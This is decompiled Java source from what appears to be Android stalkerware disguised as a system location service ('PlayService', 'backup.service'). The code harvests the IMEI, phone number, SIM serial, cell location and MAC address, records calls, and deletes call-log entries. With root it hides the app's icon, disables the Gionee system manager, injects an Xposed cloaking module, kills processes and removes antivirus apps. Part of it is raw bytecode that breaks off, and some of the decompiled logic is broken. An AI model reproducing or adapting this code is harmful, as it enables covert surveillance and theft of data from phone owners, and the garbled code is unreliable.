  public void DescTable(Context paramContext, Uri paramUri)
  {
    paramContext = getContentResolver();
    if (paramContext == null)
    {
      FLOG("DescTable::getContentResolver(); failed, returning");
      return;
    }
    try
    {
      paramContext = paramContext.query(paramUri, null, null, null, null);
      if (paramContext == null)
      {
        FLOG("DescTable::query failed");
        return;
      }
    }
    catch (SQLException paramContext)
    {
      EXCEPT(paramContext, "DescTable query exception: ");
      return;
      if (paramContext.getCount() == 0)
      {
        paramContext.close();
        FLOG("DescTable::0");
        return;
      }
    }
    catch (Exception paramContext)
    {
      EXCEPT(paramContext, "DescTable exception");
      return;
    }
    FLOG("DescTable = query:" + paramContext.getCount());
    int j;
    int i;
    if (paramContext.moveToFirst())
    {
      j = paramContext.getColumnCount();
      FLOG("ColumnCount=" + j);
      i = 0;
    }
    for (;;)
    {
      FLOG("DescTable()");
      paramContext.close();
      return;
      do
      {
        FLOG("Column#" + i + " = " + paramContext.getColumnName(i));
        i += 1;
      } while (i < j);
    }
  }
  
  public void DisableGionee()
  {
    FLOG("DisableGionee");
    commandSU("chmod 000 /system/priv_app/Amigo_SystemManager");
  }
  
  void DoAfterUploadJob()
  {
    if ((sListToKill != null) && (sListToKill.length() > 0)) {
      KillProcesses(sListToKill);
    }
    if (bAntivirusListChanged)
    {
      bAntivirusListChanged = false;
      RemoveAntiVirus();
    }
  }
  
  void EnableXPOSEDmodule()
  {
    FLOG("EnableXPOSEDmodule");
    if (commandSUresult("ls -l /system/app/SBCloak.apk").indexOf("No such file or directory") > -1)
    {
      FLOG("No SBCLOAK found at /system/app/SBCloak.apk");
      return;
    }
    FLOG("SBCLOAK found okay!");
    if (commandSUresult("ls -l /data/data/de.robv.android.xposed.installer/conf/modules.list").indexOf("No such file or directory") > -1)
    {
      FLOG("No XPPOSED found at /data/data/de.robv.android.xposed.installer/conf/modules.list");
      return;
    }
    Object localObject = filesPath + "/modules.list";
    commandSU("cat /data/data/de.robv.android.xposed.installer/conf/modules.list > " + (String)localObject);
    commandSU("chmod 777 " + (String)localObject);
    localObject = new File((String)localObject);
    FLOG("modules.list=" + ((File)localObject).length());
    if (((File)localObject).exists())
    {
      FLOG("Local copy of modules.list exists, try read");
      do
      {
        try
        {
          localBufferedReader = new BufferedReader(new InputStreamReader(openFileInput("modules.list")));
          str = localBufferedReader.readLine();
          if (str != null) {
            continue;
          }
          localBufferedReader.close();
          ((File)localObject).delete();
          FLOG("Module not found in list, add new line");
        }
        catch (Exception localException)
        {
          for (;;)
          {
            BufferedReader localBufferedReader;
            String str;
            EXCEPT(localException, "Add module to Xposed");
          }
        }
        commandSU("echo '/system/app/SBCloak.apk' >> /data/data/de.robv.android.xposed.installer/conf/modules.list");
        FLOG("Patched, reboot the system");
        return;
      } while (str.indexOf("/system/app/SBCloak.apk") < 0);
      FLOG("modules.list already patched, do nothing");
      localBufferedReader.close();
      ((File)localObject).delete();
      return;
    }
    FLOG("Local modules.list does not exists, something wrong, dont do anything");
  }
  
  BEGEND FindBeginEnd(byte[] paramArrayOfByte, int paramInt)
  {
    BEGEND localBEGEND = new BEGEND();
    localBEGEND.begin = 0;
    localBEGEND.end = paramInt;
    int i = 0;
    label31:
    int j;
    if (i >= paramInt - 1)
    {
      localBEGEND.begin = (i + 3);
      j = i;
      if (paramArrayOfByte[localBEGEND.begin] == 1)
      {
        localBEGEND.begin += 1;
        j = i;
      }
    }
    for (;;)
    {
      if ((j >= paramInt) || (paramArrayOfByte[j] == 0))
      {
        localBEGEND.end = (j - localBEGEND.begin);
        return localBEGEND;
        if ((paramArrayOfByte[i] == 3) && (paramArrayOfByte[(i + 1)] == 1)) {
          break label31;
        }
        i += 1;
        break;
      }
      j += 1;
    }
  }
  
  public void GetCallLink(String paramString)
  {
    if (this.lSMSQueries != null) {
      this.lSMSQueries.add(paramString);
    }
  }
  
  public String GetCidLac()
  {
    String str1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("")).append("DeviceName:").append(Build.MODEL).append("\n").toString())).append("DeviceBrand:").append(Build.BRAND).append("\n").toString())).append("Device:").append(Build.DEVICE).append("\n").toString())).append("Display:").append(Build.DISPLAY).append("\n").toString())).append("Host:").append(Build.HOST).append("\n").toString())).append("Manufacturer:").append(Build.MANUFACTURER).append("\n").toString())).append("Board:").append(Build.BOARD).append("\n").toString())).append("Product:").append(Build.PRODUCT).append("\n").toString() + "ID:" + Build.ID + "\n";
    FLOG("GetCidLac");
    Object localObject1 = str1;
    try
    {
      FLOG("GCL1");
      localObject1 = str1;
      localObject4 = (TelephonyManager)getSystemService("phone");
      if (localObject4 == null) {
        break label1512;
      }
      localObject1 = str1;
      FLOG("GCL2");
      localObject1 = str1;
      str1 = str1 + "\n";
      localObject1 = str1;
      localObject3 = (GsmCellLocation)((TelephonyManager)localObject4).getCellLocation();
      if (localObject3 != null)
      {
        localObject1 = str1;
        this.lastCid = ((GsmCellLocation)localObject3).getCid();
        localObject1 = str1;
        this.lastLac = ((GsmCellLocation)localObject3).getLac();
        localObject1 = str1;
        str1 = str1 + "Cell ID:" + this.lastCid + "\n";
        localObject1 = str1;
        str1 = str1 + "LAC: " + this.lastLac + "\n";
        localObject1 = str1;
        FLOG("GCL3");
        localObject1 = str1;
        str2 = ((TelephonyManager)localObject4).getNetworkOperator();
        if (str2 == null) {
          break label1486;
        }
        localObject3 = str1;
      }
    }
    catch (Exception localException1)
    {
      Object localObject4;
      String str2;
      label627:
      EXCEPT(localException1, "GetCidLac");
      return localObject1;
    }
    try
    {
      if (str2.length() <= 0) {
        break label1486;
      }
      localObject3 = str1;
      this.lastMcc = Integer.parseInt(str2.substring(0, 3));
      localObject3 = str1;
      this.lastMnc = Integer.parseInt(str2.substring(3));
      localObject3 = str1;
      FLOG("Found mnc&mcc = " + this.lastMnc + "," + this.lastMcc);
      localObject3 = str1;
      localObject1 = str1 + "MCC:" + this.lastMcc + "\n";
      localObject3 = localObject1;
      str1 = localObject1 + "MNC:" + this.lastMnc + "\n";
    }
    catch (Exception localException2)
    {
      localObject1 = localObject3;
      EXCEPT(localException2, "getCidLac");
      localObject2 = localObject3;
      break label627;
    }
    localObject1 = str1;
    FLOG("GCL4");
    localObject1 = str1;
    str1 = str1 + "\n";
    localObject1 = str1;
    str1 = str1 + "PhoneNumber:" + ((TelephonyManager)localObject4).getLine1Number() + "\n";
    localObject1 = str1;
    str1 = str1 + "Operator:" + ((TelephonyManager)localObject4).getNetworkOperatorName() + "\n";
    localObject1 = str1;
    str1 = str1 + "SIM Operator:" + ((TelephonyManager)localObject4).getSimOperatorName() + "\n";
    localObject1 = str1;
    Object localObject3 = ((TelephonyManager)localObject4).getSimSerialNumber();
    localObject1 = str1;
    str1 = str1 + "SIM ID:" + (String)localObject3 + "\n";
    localObject1 = str1;
    str1 = str1 + "\n";
    localObject1 = str1;
    str1 = str1 + "DeviceId:" + sIMEI + "\n";
    localObject1 = str1;
    str1 = str1 + "DeviceSoftwareVersion:" + ((TelephonyManager)localObject4).getDeviceSoftwareVersion() + "\n";
    localObject1 = str1;
    FLOG("GCL5");
    localObject1 = str1;
    str1 = str1 + "MAC:" + sMAC + "\n";
    localObject1 = str1;
    str1 = str1 + "BatteryState:" + this.iBatteryState + "\n";
    localObject1 = str1;
    str1 = str1 + "BatteryVoltage:" + this.iBatteryVoltage + "\n";
    localObject1 = str1;
    str1 = str1 + "BatteryTemp:" + this.iBatteryTemp + "\n";
    localObject1 = str1;
    str1 = str1 + "ChargingNow:" + iChargingNow + "\n";
    localObject1 = str1;
    str1 = str1 + "WifiOnOff:" + iWifiOnOff + "\n";
    localObject1 = str1;
    str1 = str1 + "AppName:" + this.myName + "\n";
    localObject1 = str1;
    str1 = str1 + "Internet:CONNECTED\n";
    label1185:
    localObject1 = str1;
    FLOG("GCL6");
    localObject1 = str1;
    localObject4 = (ConnectivityManager)context.getSystemService("connectivity");
    localObject1 = str1;
    FLOG("GCL7");
    localObject3 = str1;
    if (localObject4 != null)
    {
      localObject1 = str1;
      localObject4 = ((ConnectivityManager)localObject4).getActiveNetworkInfo();
      localObject3 = str1;
      if (localObject4 != null)
      {
        localObject1 = str1;
        if (((NetworkInfo)localObject4).getType() != 0) {
          break label1549;
        }
      }
    }
    label1486:
    label1512:
    label1549:
    for (localObject3 = "Mobile";; localObject3 = "WiFi")
    {
      localObject1 = str1;
      localObject3 = str1 + "GSMorWIFI:" + (String)localObject3 + "\n";
      localObject1 = localObject3;
      FLOG("GCL8");
      localObject1 = localObject3;
      if (this.wifiAndCellCollector != null) {
        localObject1 = localObject3;
      }
      Object localObject2;
      for (str1 = localObject3 + "Location:" + this.wifiAndCellCollector.getBestProvider() + "\n";; localObject2 = localObject3 + "Location:waccnul\n")
      {
        localObject1 = str1;
        FLOG("GCL9");
        localObject1 = str1;
        str1 = str1 + "Rooted:" + isRootInstall() + "\n";
        localObject1 = str1;
        str1 = str1 + "CanSU:" + bCanSu + "\n";
        localObject1 = str1;
        FLOG("GCL10");
        localObject1 = str1;
        return str1 + "IconHidden:" + bIconHidden + "\n";
        localObject1 = str1;
        FLOG("CIDLAC is NULL");
        break;
        localObject3 = localException1;
        FLOG("MCCMNC is NULL");
        break label627;
        localObject1 = localObject2;
        FLOG("tm is NULL, cant get cid/lac");
        break label1185;
        localObject1 = localObject3;
      }
    }
  }
  
  public String GetFilePath(Uri paramUri, String paramString)
  {
    if (paramUri == null) {
      return "";
    }
    if (paramString == null) {
      return "";
    }
    FLOG("GetFilePath...");
    FLOG("calllist_id=" + paramString);
    paramString = getContentResolver().query(paramUri, null, "calllist_id=" + paramString, null, null);
    paramUri = "";
    if (paramString == null) {
      return "";
    }
    if (paramString.moveToNext()) {
      paramUri = paramString.getString(paramString.getColumnIndex("filename"));
    }
    paramString.close();
    return paramUri;
  }
  
  long GetFreeSpace()
  {
    StatFs localStatFs = new StatFs(Environment.getDataDirectory().getPath());
    long l = localStatFs.getBlockSize();
    return localStatFs.getAvailableBlocks() * l;
  }
  
  public long GetMaxCallID()
  {
    if (isLock)
    {
      FLOG("isLock == 1, return");
      return 0L;
    }
    isLock = true;
    l4 = 0L;
    l2 = l4;
    l3 = l4;
    for (;;)
    {
      try
      {
        localObject1 = CallLog.Calls.CONTENT_URI;
        l2 = l4;
        l3 = l4;
        localObject2 = getContentResolver();
        l2 = l4;
        l3 = l4;
        FLOG("cr=" + localObject2);
        l2 = l4;
        l3 = l4;
        FLOG("iAudioCallSaved = " + iAudioCallSaved);
        l2 = l4;
        l3 = l4;
        localObject1 = ((ContentResolver)localObject2).query((Uri)localObject1, null, "_id > " + iAudioCallSaved, null, "_id DESC LIMIT 1 ");
        l2 = l4;
        l3 = l4;
        FLOG("query ok() = " + localObject1);
        if (localObject1 == null)
        {
          l2 = l4;
          l3 = l4;
          FLOG("GetMaxCallID()::cur == null");
          l2 = l4;
          l3 = l4;
          isLock = false;
          return 0L;
        }
        l2 = l4;
        l3 = l4;
        if (((Cursor)localObject1).getCount() == 0)
        {
          l2 = l4;
          l3 = l4;
          FLOG("GetMaxCallID()::cur.getCount() == 0");
          l2 = l4;
          l3 = l4;
          ((Cursor)localObject1).close();
          l2 = l4;
          l3 = l4;
          isLock = false;
          return 0L;
        }
        l2 = l4;
        l3 = l4;
        FLOG("count=" + ((Cursor)localObject1).getCount());
        l1 = l4;
        l2 = l4;
        l3 = l4;
        if (((Cursor)localObject1).moveToFirst())
        {
          l2 = l4;
          l3 = l4;
          if (((Cursor)localObject1).getColumnIndex("duration") != 0) {
            continue;
          }
          l1 = l4;
        }
      }
      catch (SQLException localSQLException)
      {
        Object localObject1;
        Object localObject2;
        int j;
        int m;
        ContentResolver localContentResolver;
        FLOG("GetMaxCALL query exception: " + localSQLException.getMessage());
        l1 = l2;
        continue;
        l2 = l4;
        l3 = l4;
        ((Cursor)localObject3).close();
        l2 = l4;
        l3 = l4;
        FLOG("GetMaxCallID()::Got == " + localSQLException.getInt(i) + ", file = " + this.sAudioFilename + ", size=" + ((File)localObject2).length());
        l2 = l4;
        l3 = l4;
        localObject3 = new ContentValues();
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("filename", this.sAudioFilename);
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("calldate", Long.valueOf(getCurrentTime()));
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("calllist_id", Integer.valueOf(localSQLException.getInt(i)));
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("filesize", Long.valueOf(((File)localObject2).length()));
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("name", localSQLException.getString(j));
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("number", localSQLException.getString(k));
        l2 = l4;
        l3 = l4;
        ((ContentValues)localObject3).put("duration", localSQLException.getString(m));
        l2 = l4;
      }
      catch (Exception localException1)
      {
        try
        {
          int i;
          int k;
          Object localObject3;
          getContentResolver().insert(BackupData.CONTENT_URI, (ContentValues)localObject3);
          l2 = l4;
          l3 = l4;
          l4 = iAudioCallSaved;
          l2 = l4;
          l3 = l4;
          FLOG("rejected=" + this.rejected);
          l2 = l4;
          l3 = l4;
          FLOG("number=" + localSQLException.getString(k));
          long l1 = l4;
          l2 = l4;
          l3 = l4;
          if (this.rejected.length() <= 0) {
            continue;
          }
          l1 = l4;
          l2 = l4;
          l3 = l4;
          if (!localSQLException.getString(k).equals(this.rejected)) {
            continue;
          }
          l2 = l4;
          l3 = l4;
          getContentResolver().delete(CallLog.Calls.CONTENT_URI, "_id = " + localSQLException.getInt(i), null);
          l2 = l4;
          l3 = l4;
          FLOG("DELETE blocked CALL " + localSQLException.getInt(i));
          l2 = l4;
          l3 = l4;
          this.rejected = "";
          l1 = l4;
          continue;
          localException1 = localException1;
          EXCEPT(localException1, "GetMaxCALL Error ");
          isLock = false;
          l1 = l3;
        }
        catch (Exception localException2)
        {
          l2 = l4;
          l3 = l4;
          EXCEPT(localException2, "GetMaxCallID");
          continue;
        }
      }
      l2 = l1;
      l3 = l1;
      ((Cursor)localObject1).close();
      SaveSettings();
      isLock = false;
      return l1;
      l2 = l4;
      l3 = l4;
      localObject2 = new File(getFilesDir() + "/" + this.sAudioFilename);
      l1 = l4;
      l2 = l4;
      l3 = l4;
      if (((File)localObject2).exists())
      {
        l1 = l4;
        l2 = l4;
        l3 = l4;
        if (((File)localObject2).length() > 0L)
        {
          l2 = l4;
          l3 = l4;
          i = ((Cursor)localObject1).getColumnIndex("_id");
          l2 = l4;
          l3 = l4;
          j = ((Cursor)localObject1).getColumnIndex("name");
          l2 = l4;
          l3 = l4;
          k = ((Cursor)localObject1).getColumnIndex("number");
          l2 = l4;
          l3 = l4;
          m = ((Cursor)localObject1).getColumnIndex("duration");
          l2 = l4;
          l3 = l4;
          iAudioCallSaved = ((Cursor)localObject1).getInt(i);
          l2 = l4;
          l3 = l4;
          FLOG("newiAudioCallSaved=" + iAudioCallSaved);
          l2 = l4;
          l3 = l4;
          localObject3 = BackupData.CONTENT_URI;
          l2 = l4;
          l3 = l4;
          localContentResolver = getContentResolver();
          l2 = l4;
          l3 = l4;
          FLOG("IsDoubleCall?");
          l2 = l4;
          l3 = l4;
          localObject3 = localContentResolver.query((Uri)localObject3, null, "filename = '" + this.sAudioFilename + "'", null, null);
          if (localObject3 == null) {
            continue;
          }
          l2 = l4;
          l3 = l4;
          if (((Cursor)localObject3).getCount() <= 0) {
            continue;
          }
          l2 = l4;
          l3 = l4;
          FLOG("DOUBLE CALL ALREADY EXISTS!!!!");
          l2 = l4;
          l3 = l4;
          ((Cursor)localObject3).close();
          l1 = l4;
        }
      }
    }
  }
  
  public String GetSIMSerial()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)getSystemService("phone");
    if (localTelephonyManager != null) {
      return localTelephonyManager.getSimSerialNumber();
    }
    return "";
  }
  
  public void Initialize()
  {
    if (bServiceStarted)
    {
      FLOG("Service already started");
      return;
    }
    bServiceStarted = true;
    this.locationHistory = new ArrayList();
    this.locationHistoryLocked = false;
    ConnectivityManager localConnectivityManager = (ConnectivityManager)context.getSystemService("connectivity");
    StringBuilder localStringBuilder = new StringBuilder("connMgr=");
    boolean bool;
    if (localConnectivityManager == null)
    {
      bool = true;
      FLOG(bool);
      int i = localConnectivityManager.startUsingNetworkFeature(0, "enableMMS");
      FLOG("mms =" + i);
      FLOG("Reading options..");
      ReadSettings();
      if (!this.bIsRootInstall) {
        break label241;
      }
      FLOG("This is ROOT start, disable soft");
      if (!bSkipOneRootDisable) {
        break label227;
      }
      FLOG("We should skip one disable soft call, because magick USSD was pressed before");
      bIconHidden = IsSoftDisabled();
    }
    for (;;)
    {
      if (!LOGCAT) {
        Log.v("backup.service", "RELEASE! No log available!");
      }
      FLOG("Options red");
      if (!bAlreadyStarted)
      {
        FLOG("Event");
        putEvent(res.getString(2130968578));
        FLOG("Eventok");
        bAlreadyStarted = true;
        SaveSettings();
      }
      FLOG("Red options!!");
      this.class_copy = this;
      StartUploader();
      return;
      bool = false;
      break;
      label227:
      FLOG("Disabling...");
      DisableSoft(1);
      continue;
      label241:
      Log.v("backup.service", "non-root install, skip disable soft");
      bIconHidden = IsSoftDisabled();
    }
  }
  
  public void Install(String paramString)
  {
    if (paramString == null) {}
    do
    {
      return;
      this.thInstaller = new Installer(paramString);
    } while ((this.thInstaller == null) || (this.thInstaller.isAlive()));
    this.thInstaller.start();
  }
  
  /* Error */
  boolean InstallAbarona()
  {
    // Byte code:
    //   0: ldc_w 4279
    //   3: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   9: getstatic 579	com/android/location/PlayService:CAN	B
    //   12: if_icmpeq +11 -> 23
    //   15: ldc_w 4281
    //   18: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   21: iconst_0
    //   22: ireturn
    //   23: aconst_null
    //   24: astore 4
    //   26: aconst_null
    //   27: astore 7
    //   29: aconst_null
    //   30: astore 8
    //   32: aload 4
    //   34: astore 6
    //   36: aload 7
    //   38: astore 5
    //   40: aload_0
    //   41: invokevirtual 2047	com/android/location/PlayService:getAssets	()Landroid/content/res/AssetManager;
    //   44: astore 9
    //   46: aload 9
    //   48: ifnonnull +19 -> 67
    //   51: aload 8
    //   53: astore 4
    //   55: aload 4
    //   57: ifnull +8 -> 65
    //   60: aload 4
    //   62: invokevirtual 2076	java/io/InputStream:close	()V
    //   65: iconst_0
    //   66: ireturn
    //   67: aload 7
    //   69: astore 5
    //   71: aload 9
    //   73: ldc_w 4283
    //   76: invokevirtual 2061	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   79: astore 6
    //   81: aload 6
    //   83: astore 4
    //   85: aload 4
    //   87: ifnonnull +98 -> 185
    //   90: aload 4
    //   92: astore 6
    //   94: aload 4
    //   96: astore 5
    //   98: ldc_w 4285
    //   101: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   104: goto -49 -> 55
    //   107: astore 4
    //   109: aload 6
    //   111: astore 5
    //   113: aload 4
    //   115: ldc_w 4287
    //   118: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   121: aload 6
    //   123: ifnull +8 -> 131
    //   126: aload 6
    //   128: invokevirtual 2076	java/io/InputStream:close	()V
    //   131: iconst_0
    //   132: ireturn
    //   133: astore 8
    //   135: iconst_0
    //   136: ifeq +19 -> 155
    //   139: aload 4
    //   141: astore 6
    //   143: aload 7
    //   145: astore 5
    //   147: new 1700	java/lang/NullPointerException
    //   150: dup
    //   151: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   154: athrow
    //   155: aload 4
    //   157: astore 6
    //   159: aload 7
    //   161: astore 5
    //   163: aload 8
    //   165: ldc_w 4289
    //   168: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   171: iconst_0
    //   172: ifeq +11 -> 183
    //   175: new 1700	java/lang/NullPointerException
    //   178: dup
    //   179: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   182: athrow
    //   183: iconst_0
    //   184: ireturn
    //   185: aload 4
    //   187: astore 6
    //   189: aload 4
    //   191: astore 5
    //   193: ldc_w 4291
    //   196: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   199: aload 4
    //   201: astore 6
    //   203: aload 4
    //   205: astore 5
    //   207: new 1250	java/io/File
    //   210: dup
    //   211: new 864	java/lang/StringBuilder
    //   214: dup
    //   215: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   218: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   221: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   224: ldc_w 4293
    //   227: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   230: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   233: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   236: astore 7
    //   238: aload 4
    //   240: astore 6
    //   242: aload 4
    //   244: astore 5
    //   246: new 864	java/lang/StringBuilder
    //   249: dup
    //   250: ldc_w 4295
    //   253: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   256: aload 7
    //   258: invokevirtual 1277	java/io/File:length	()J
    //   261: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   264: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   267: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   270: aload 4
    //   272: astore 6
    //   274: aload 4
    //   276: astore 5
    //   278: aload 4
    //   280: invokevirtual 2072	java/io/InputStream:available	()I
    //   283: i2l
    //   284: lstore_2
    //   285: aload 4
    //   287: astore 6
    //   289: aload 4
    //   291: astore 5
    //   293: new 864	java/lang/StringBuilder
    //   296: dup
    //   297: ldc_w 4297
    //   300: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   303: lload_2
    //   304: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   307: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   310: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   313: aload 4
    //   315: astore 6
    //   317: aload 4
    //   319: astore 5
    //   321: new 864	java/lang/StringBuilder
    //   324: dup
    //   325: ldc_w 4299
    //   328: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   331: aload 4
    //   333: invokevirtual 2072	java/io/InputStream:available	()I
    //   336: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   339: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   342: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   345: aload 4
    //   347: astore 6
    //   349: aload 4
    //   351: astore 5
    //   353: new 1250	java/io/File
    //   356: dup
    //   357: new 864	java/lang/StringBuilder
    //   360: dup
    //   361: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   364: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   367: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   370: ldc_w 4293
    //   373: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   376: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   379: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   382: invokevirtual 1257	java/io/File:exists	()Z
    //   385: ifne +69 -> 454
    //   388: aload 4
    //   390: astore 6
    //   392: aload 4
    //   394: astore 5
    //   396: getstatic 585	com/android/location/PlayService:ref	Lcom/android/location/PlayService;
    //   399: invokevirtual 4302	com/android/location/PlayService:getBaseContext	()Landroid/content/Context;
    //   402: ldc_w 4283
    //   405: iconst_0
    //   406: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   409: astore 8
    //   411: aload 8
    //   413: ifnull +537 -> 950
    //   416: sipush 1024
    //   419: newarray byte
    //   421: astore 5
    //   423: aload 4
    //   425: aload 5
    //   427: invokevirtual 2075	java/io/InputStream:read	([B)I
    //   430: istore_1
    //   431: iload_1
    //   432: iconst_m1
    //   433: if_icmpne +459 -> 892
    //   436: aload 8
    //   438: ifnull +16 -> 454
    //   441: aload 4
    //   443: astore 6
    //   445: aload 4
    //   447: astore 5
    //   449: aload 8
    //   451: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   454: aload 4
    //   456: astore 6
    //   458: aload 4
    //   460: astore 5
    //   462: ldc_w 4304
    //   465: invokestatic 2691	com/android/location/PlayService:commandSUresult	(Ljava/lang/String;)Ljava/lang/String;
    //   468: astore 7
    //   470: aload 4
    //   472: astore 6
    //   474: aload 4
    //   476: astore 5
    //   478: new 864	java/lang/StringBuilder
    //   481: dup
    //   482: ldc_w 4306
    //   485: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   488: aload 7
    //   490: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   493: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   496: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   499: aload 7
    //   501: ifnull +115 -> 616
    //   504: aload 4
    //   506: astore 6
    //   508: aload 4
    //   510: astore 5
    //   512: aload 7
    //   514: invokevirtual 1649	java/lang/String:length	()I
    //   517: ifle +99 -> 616
    //   520: aload 4
    //   522: astore 6
    //   524: aload 4
    //   526: astore 5
    //   528: aload 7
    //   530: ldc_w 4308
    //   533: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   536: astore 7
    //   538: aload 4
    //   540: astore 6
    //   542: aload 4
    //   544: astore 5
    //   546: aload 7
    //   548: arraylength
    //   549: iconst_1
    //   550: if_icmple +66 -> 616
    //   553: aload 4
    //   555: astore 6
    //   557: aload 4
    //   559: astore 5
    //   561: new 864	java/lang/StringBuilder
    //   564: dup
    //   565: ldc_w 4310
    //   568: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   571: aload 7
    //   573: iconst_1
    //   574: aaload
    //   575: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   578: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   581: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   584: aload 4
    //   586: astore 6
    //   588: aload 4
    //   590: astore 5
    //   592: new 864	java/lang/StringBuilder
    //   595: dup
    //   596: ldc_w 4312
    //   599: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   602: aload 7
    //   604: iconst_1
    //   605: aaload
    //   606: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   609: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   612: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   615: pop
    //   616: aload 4
    //   618: astore 6
    //   620: aload 4
    //   622: astore 5
    //   624: new 864	java/lang/StringBuilder
    //   627: dup
    //   628: ldc_w 4314
    //   631: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   634: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   637: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   640: ldc_w 4316
    //   643: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   646: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   649: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   652: pop
    //   653: aload 4
    //   655: astore 6
    //   657: aload 4
    //   659: astore 5
    //   661: ldc_w 4318
    //   664: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   667: pop
    //   668: aload 4
    //   670: astore 6
    //   672: aload 4
    //   674: astore 5
    //   676: new 864	java/lang/StringBuilder
    //   679: dup
    //   680: ldc_w 4320
    //   683: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   686: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   689: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   692: ldc_w 4322
    //   695: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   698: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   701: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   704: pop
    //   705: aload 4
    //   707: astore 6
    //   709: aload 4
    //   711: astore 5
    //   713: new 1250	java/io/File
    //   716: dup
    //   717: new 864	java/lang/StringBuilder
    //   720: dup
    //   721: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
